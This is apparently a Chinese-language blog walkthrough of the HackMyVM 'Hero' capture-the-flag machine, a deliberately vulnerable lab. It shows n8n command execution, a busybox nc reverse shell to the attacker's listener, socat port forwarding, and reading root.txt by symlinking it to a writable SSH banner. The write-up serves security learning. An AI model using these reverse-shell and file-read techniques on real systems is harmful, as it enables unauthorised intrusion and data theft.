---
title: HackMyVM-Hero
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# Hero.

> https://hackmyvm.eu/machines/machine.php?vm=Hero
> 

Notes : **CTF like. Have fun.**

## 信息收集

```python
┌──(root㉿kali)-[~]
└─# nmap -sP 192.168.56.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 02:55 EST
Nmap scan report for 192.168.56.1
Host is up (0.00036s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00038s latency).
MAC Address: 08:00:27:9B:DC:81 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.18
Host is up (0.00030s latency).
MAC Address: 08:00:27:04:19:79 (Oracle VirtualBox virtual NIC)
```

```python
┌──(root㉿kali)-[~]
└─# nmap -sT -min-rate 10000 -p- 192.168.56.18 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 02:55 EST
Nmap scan report for 192.168.56.18
Host is up (0.0012s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
5678/tcp open  rrac
MAC Address: 08:00:27:04:19:79 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 16.87 seconds
```

```python
┌──(root㉿kali)-[~]                                                                                                                                          
└─# nmap -sT -A -T4 -p 80,5678 192.168.56.18                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 02:56 EST           
Nmap scan report for 192.168.56.18                                            
Host is up (0.00056s latency).                                                                                                                               
                                                                              
PORT     STATE SERVICE VERSION                                                
80/tcp   open  http    nginx                                                  
|_http-title: Site doesn't have a title (text/html).                          
5678/tcp open  rrac?                                                          
| fingerprint-strings:                                                        
|   GetRequest:                                                                                                                                              
|     HTTP/1.1 200 OK                                                         
|     Accept-Ranges: bytes                                                    
|     Cache-Control: public, max-age=86400                                    
|     Last-Modified: Fri, 07 Feb 2025 07:53:54 GMT 
...
MAC Address: 08:00:27:04:19:79 (Oracle VirtualBox virtual NIC)                                                                                               
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                        
Device type: general purpose                                                  
Running: Linux 4.X|5.X                                                        
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5               
OS details: Linux 4.15 - 5.8                                                                                                                                 
Network Distance: 1 hop                                                       
                                                                              
TRACEROUTE                                                                    
HOP RTT     ADDRESS                                                           
1   0.56 ms 192.168.56.18
```

`5678`是未知端口，`80`是`http`

## 80 端口

访问主页，看着像是`ssh`的私钥，但是靶机没开启`ssh`端口

```python
┌──(root㉿kali)-[~]
└─# curl 192.168.56.18         
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwgAAAJAczctSHM3L
UgAAAAtzc2gtZWQyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwg
AAAEAnYotUqBFoopjEVz9Sa9viQ8AhNVTx0K19TC7YQyfwAqiYY31x+ZMvvHfmGWC7ZE75
BbdbAKYEtIX75k6CL27CAAAACnNoYXdhQGhlcm8BAgM=
-----END OPENSSH PRIVATE KEY-----
```

通过`base64`解码可以得到一个用户名`shawa`

![image.png](image%2061.png)

## 5678 端口

访问主页，是了`n8n` （开源工作流自动化工具）的安装页面

![image.png](image%2062.png)

我们先随便填点东西安装进去

安装后寻找可以利用的点，不要忘记还有`ssh`密钥

## 命令执行

在 `create Workflow`中发现带有命令执行的字样

![image.png](image%2063.png)

添加`Execute Command`后，双击进去，出现输入框，测试一下是否能执行命令，成功执行，当前用户是`node`

![image.png](image%2064.png)

测试一下是否存在`nc`命令,测试之后提示`busybox` ，我们再使用通过`busybox`来执行`nc`

![image.png](image%2065.png)

`kali`开启监听，并在`Command`框输入`nc`反弹`shell`命令

```python
┌──(root㉿kali)-[~]
└─# nc -lvp 4444
listening on [any] 4444 ...
```

```python
busybox nc 192.168.56.4 4444 -e /bin/sh
```

然后就能接收到靶机弹回来的`shell`了

```python
┌──(root㉿kali)-[~]
└─# nc -lvp 4444
listening on [any] 4444 ...
192.168.56.18: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.4] from (UNKNOWN) [192.168.56.18] 36561
whoami
node
```

## 靶机信息收集 - 1

```python
uname -a
Linux 83ed090ff160 6.12.11-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2025-01-24 20:02:52 x86_64 Linux

id
uid=1000(node) gid=1000(node) groups=1000(node)

ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

看到`.dockerenv` 文件，还有`ip`地址，应该是在`docker`环境里面，继续信息收集

```python
ls -al
total 76
drwxr-xr-x    1 root     root          4096 Feb  6 10:15 .
drwxr-xr-x    1 root     root          4096 Feb  6 10:15 ..
-rwxr-xr-x    1 root     root             0 Feb  6 10:15 .dockerenv
drwxr-xr-x    1 root     root          4096 Jan 22 15:25 bin
drwxr-xr-x    5 root     root           340 Feb  7 07:53 dev
-rwxr-xr-x    1 root     root           384 Feb  4 13:47 docker-entrypoint.sh
drwxr-xr-x    1 root     root          4096 Feb  6 10:15 etc
drwxr-xr-x    1 root     root          4096 Jan 22 15:25 home
drwxr-xr-x    1 root     root          4096 Feb  3 10:50 lib
drwxr-xr-x    2 root     root          4096 Feb  3 10:50 lib64
drwxr-xr-x    5 root     root          4096 Jan  8 11:04 media
drwxr-xr-x    2 root     root          4096 Jan  8 11:04 mnt
drwxr-xr-x    1 root     root          4096 Jan 22 15:25 opt
dr-xr-xr-x  148 root     root             0 Feb  7 07:53 proc
drwx------    1 root     root          4096 Feb  3 10:50 root
drwxr-xr-x    3 root     root          4096 Jan  8 11:04 run
drwxr-xr-x    1 root     root          4096 Feb  3 10:50 sbin
drwxr-xr-x    2 root     root          4096 Jan  8 11:04 srv
dr-xr-xr-x   13 root     root             0 Feb  7 07:53 sys
drwxrwxrwt    2 root     root          4096 Jan  8 11:04 tmp
drwxr-xr-x    1 root     root          4096 Feb  3 10:50 usr
drwxr-xr-x    1 root     root          4096 Jan  8 11:04 var
```

没找到可以利用的，应该是个兔子洞（也不一定是），但是我们手里还有`ssh`密钥，而且也拿到了`docker`的网段`172.17.0.0` ，那么`docker`连接宿主机的`ip`就是`172.17.0.1`

## SSH 命令执行

通过在`workflow`搜索`ssh`，可以找到`ssh`的版块，也可以进行命令执行

![image.png](image%2066.png)

我们设置一下参数，点击`Create new Credential` ，使用上面得到的信息来填写，保存后能看到`Connection tested successfully` 

![image.png](image%2067.png)

然后测试一下命令`id` ，是`shawa`用户，命令执行正常

![image.png](image%2068.png)

那么就是反弹`shell`了，和上面的步骤一样

## 靶机信息收集 - 2

可以看到`ip`是靶机的`ip`了

```python
id
uid=1000(shawa) gid=1000(shawa) groups=1000(shawa)

ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 08:00:27:04:19:79 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.18/24 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe04:1979/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:48:67:43:a4 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:48ff:fe67:43a4/64 scope link 
       valid_lft forever preferred_lft forever
5: vethb3c6e75@if4: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue master docker0 state UP 
    link/ether 9a:cf:45:46:c8:62 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::98cf:45ff:fe46:c862/64 scope link 
       valid_lft forever preferred_lft forever
       
uname -a
Linux hero 6.12.11-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2025-01-24 20:02:52 x86_64 Linux

```

## UserFlag

可以在用户家目录找到`userFlag`

```python
cat user.txt
HMVOHIMNOTREAL
```

## 获得交互式shell

因为我们可以通过`n8n`来使用`ssh`密钥登录，那么肯定`22`端口应该就是在`172.17.0.1`上监听着

查看当前主机的监听和网络连接端口，可以看到和我们的猜想一样

```python
busybox netstat -lntup
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name

tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5678            0.0.0.0:*               LISTEN      -
tcp        0      0 172.17.0.1:22           0.0.0.0:*               LISTEN      -
tcp        0      0 :::80                   :::*                    LISTEN      -
tcp        0      0 :::5678                 :::*                    LISTEN      -
```

通过`socat`来转发

1. `Kali`开启`web`服务器将`socat`上传至靶机
2. 靶机通过`socat`来实现端口转发
    
    ```python
    ./socat TCP-LISTEN:2222,fork TCP4:172.17.0.1:22 &
    ```
    
    > 该命令在本地机器上启动了一个 TCP 端口 `2222` 的监听，任何连接到 `127.0.0.1:2222` 的请求都会被转发到 `127.0.0.1:22`（即本地的 SSH 服务）
    > 
3. `netstat`验证一下，可以看到`2222`端口在监听了
    
    ```python
    busybox netstat -lntup
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
    tcp        0      0 0.0.0.0:5678            0.0.0.0:*               LISTEN      -
    tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      3271/socat
    tcp        0      0 172.17.0.1:22           0.0.0.0:*               LISTEN      -
    tcp        0      0 :::80                   :::*                    LISTEN      -
    tcp        0      0 :::5678                 :::*                    LISTEN      -
    ```
    
4. 连接`SSH` ，拿到交互式`shell` （ps：之前上传的`socat`不知道为什么应该是太新了，会无法转发，之后上传了一个旧版本就可以正常转发了）
    
    ```python
    ┌──(root㉿kali)-[~/Desktop/test/Hero]
    └─# ssh shawa@192.168.56.18 -p 2222 -i id_rsa
    The authenticity of host '[192.168.56.18]:2222 ([192.168.56.18]:2222)' can't be established.
    ED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.
    This key is not known by any other names.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '[192.168.56.18]:2222' (ED25519) to the list of known hosts.
    shawa was here.
    Welcome to Alpine!
    
    The Alpine Wiki contains a large amount of how-to guides and general
    information about administrating Alpine systems.
    See <https://wiki.alpinelinux.org/>.
    
    You can setup the system with the command: setup-alpine
    
    You may change this message by editing /etc/motd.
    
    hero:~$ 
    
    ```
    

## 提权

总之就是很不对劲（通过老们提示），这个位置是`ssh`的`banner`

![image.png](image%2069.png)

查看一下`banner`

```python
hero:~$ grep -i "banner" /etc/ssh/sshd_config
# no default banner path
Banner /opt/banner.txt
```

```python
hero:/opt$ cat banner.txt
shawa was here.
```

可以看到我们拥有修改权限

```python
hero:/opt$ ls -al
total 16
drw-rw-rwx    3 root     root          4096 Feb  6 10:14 .
drwxr-xr-x   21 root     root          4096 Feb  6 10:03 ..
-rw-rw-rw-    1 root     root            16 Feb  6 10:09 banner.txt
drwx--x--x    4 root     root          4096 Feb  6 10:14 containerd
```

## RootFlag

不用提权了，可以直接通过`banner`来读取`root.txt`文件

1. 删除`banner.txt`
    
    ```python
    hero:/opt$ rm banner.txt
    ```
    
2. 通过符号链接把`root.txt`连接到`/opt/banner.txt`
    
    ```python
    hero:/opt$ ln -s /root/root.txt /opt/banner.txt
    ```
    
3. 最后通过`SSH`登录`Root`用户，显示`banner`
    
    ```python
    hero:/opt$ ssh root@172.17.0.1
    The authenticity of host '172.17.0.1 (172.17.0.1)' can't be established.
    ED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.
    This key is not known by any other names.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '172.17.0.1' (ED25519) to the list of known hosts.
    HMVNOTINPRODLOL
    root@172.17.0.1's password:
    ```
    

## 总结

学习到使用`socat`实现端口转发，以及`SSH banner`